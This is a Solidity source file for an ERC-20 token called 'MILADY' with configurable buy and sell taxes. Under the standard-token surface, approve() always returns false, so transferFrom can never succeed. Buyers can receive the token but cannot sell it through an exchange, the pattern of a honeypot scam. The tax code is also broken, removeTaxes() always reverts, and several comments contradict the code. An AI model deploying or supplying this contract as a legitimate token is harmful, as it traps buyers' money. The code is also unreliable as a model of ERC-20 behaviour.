// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MILADY is IERC20 {
    string public name = "PrincessJesusHero1Inu"; // Set your token name here
    string public symbol = "MILADY";         // Set your token symbol here
    uint8 public decimals = 18;
    uint256 private _totalSupply = 489000000 * (10 ** uint256(decimals)); // Example for 1 million tokens

    uint256 public buyTaxPercent = 5;     // Set buy tax percent here (Example: 5%)
    uint256 public sellTaxPercent = 10;   // Set sell tax percent here (Example: 10%)
    bool public taxesRemoved = true;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        require(buyTaxPercent <= 100 && sellTaxPercent <= 100, "Tax too high.");
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function removeTaxes() external {
        require(!taxesRemoved, "Taxes removed.");
        buyTaxPercent = 0;
        sellTaxPercent = 0;
        taxesRemoved = true;
    }

    function _applyTax(uint256 amount, uint256 taxPercent) internal pure returns (uint256) {
        return amount - (amount * taxPercent / 100);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(recipient != address(0), "Transfer to zero address");
        
        uint256 finalAmount = amount;
        if (!taxesRemoved) {
            if (recipient == address(this) || recipient == address(0)) {
                finalAmount = _applyTax(amount, sellTaxPercent);
            } else {
                finalAmount = _applyTax(amount, buyTaxPercent);
            }
        }

        require(_balances[msg.sender] >= finalAmount, "Insufficient balance");
        
        _balances[msg.sender] -= finalAmount;
        _balances[recipient] += finalAmount;
        emit Transfer(msg.sender, recipient, finalAmount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        
        uint256 finalAmount = amount;
        if (!taxesRemoved) {
            if (recipient == address(this) || recipient == address(0)) {
                finalAmount = _applyTax(amount, sellTaxPercent);
            } else {
                finalAmount = _applyTax(amount, buyTaxPercent);
            }
        }

        require(_balances[sender] >= finalAmount, "Insufficient balance");
        require(_allowances[sender][msg.sender] >= finalAmount, "Allowance exceeded");

        _balances[sender] -= finalAmount;
        _balances[recipient] += finalAmount;
        _allowances[sender][msg.sender] -= finalAmount;
        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        return false;
    }
}